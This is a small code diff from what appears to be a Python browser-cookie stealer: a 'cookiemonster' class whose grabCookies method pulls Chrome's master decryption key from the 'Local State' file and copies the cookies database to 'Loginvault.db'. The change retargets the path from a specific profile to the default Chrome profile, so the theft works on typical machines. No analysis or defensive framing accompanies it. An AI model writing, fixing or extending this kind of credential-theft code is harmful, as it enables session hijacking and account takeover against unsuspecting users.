@@ -388,7 +388,7 @@ class cookiemonster:
         
     def grabCookies(self):
         master_key = self.get_master_key(self.appdata+'\\Google\\Chrome\\User Data\\Local State')
-        login_db = '"{}\\Google\\Chrome\\User Data\\Profile 3\\Network\\cookies"'.format(self.appdata)
+        login_db = '"{}\\Google\\Chrome\\User Data\\default\\Network\\cookies"'.format(self.appdata)
         try:
             copy2(login_db, "Loginvault.db")
         except Exception:
